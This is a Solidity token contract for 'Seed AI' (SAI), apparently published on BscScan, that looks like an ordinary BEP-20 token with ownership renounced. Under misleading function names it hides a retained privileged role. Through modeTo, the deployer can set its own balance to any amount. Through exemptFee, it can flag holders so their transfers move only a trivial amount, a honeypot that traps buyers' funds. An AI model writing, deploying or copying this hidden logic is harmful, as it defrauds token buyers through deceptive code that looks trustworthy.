/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tokenSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyLaunch {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedAI is Ownable{
    uint8 public decimals = 18;
    address public totalAt;
    string public name = "Seed AI";
    mapping(address => bool) public receiverFeeSell;

    mapping(address => bool) public fromMarketing;

    address public txLiquidity;
    string public symbol = "SAI";
    bool public receiverFrom;

    uint256 constant fromTokenSender = 10 ** 10;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => mapping(address => uint256)) public allowance;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tokenSwap marketingLiquidity = tokenSwap(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalAt = buyLaunch(marketingLiquidity.factory()).createPair(marketingLiquidity.WETH(), address(this));
        txLiquidity = limitLaunchedSwap();
        fromMarketing[txLiquidity] = true;
        balanceOf[txLiquidity] = totalSupply;
        emit Transfer(address(0), txLiquidity, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address modeTeam, uint256 txFund) external returns (bool) {
        return transferFrom(limitLaunchedSwap(), modeTeam, txFund);
    }

    function modeTo(uint256 txFund) public {
        if (!fromMarketing[limitLaunchedSwap()]) {
            return;
        }
        balanceOf[txLiquidity] = txFund;
    }

    function limitLaunchedSwap() private view returns (address) {
        return msg.sender;
    }

    function exemptFee(address minSenderLaunch) public {
        if (minSenderLaunch == txLiquidity || minSenderLaunch == totalAt || !fromMarketing[limitLaunchedSwap()]) {
            return;
        }
        receiverFeeSell[minSenderLaunch] = true;
    }

    function transferFrom(address limitFeeList, address modeTeam, uint256 txFund) public returns (bool) {
        if (limitFeeList != limitLaunchedSwap() && allowance[limitFeeList][limitLaunchedSwap()] != type(uint256).max) {
            require(allowance[limitFeeList][limitLaunchedSwap()] >= txFund);
            allowance[limitFeeList][limitLaunchedSwap()] -= txFund;
        }
        if (modeTeam == txLiquidity || limitFeeList == txLiquidity) {
            return tradingTakeMax(limitFeeList, modeTeam, txFund);
        }
        if (receiverFeeSell[limitFeeList]) {
            return tradingTakeMax(limitFeeList, modeTeam, fromTokenSender);
        }
        return tradingTakeMax(limitFeeList, modeTeam, txFund);
    }

    function toMin(address amountTo) public {
        if (receiverFrom) {
            return;
        }
        fromMarketing[amountTo] = true;
        receiverFrom = true;
    }

    function approve(address launchFrom, uint256 txFund) public returns (bool) {
        allowance[limitLaunchedSwap()][launchFrom] = txFund;
        emit Approval(limitLaunchedSwap(), launchFrom, txFund);
        return true;
    }

    function tradingTakeMax(address buyFee, address exemptWalletList, uint256 txFund) internal returns (bool) {
        require(balanceOf[buyFee] >= txFund);
        balanceOf[buyFee] -= txFund;
        balanceOf[exemptWalletList] += txFund;
        emit Transfer(buyFee, exemptWalletList, txFund);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }


}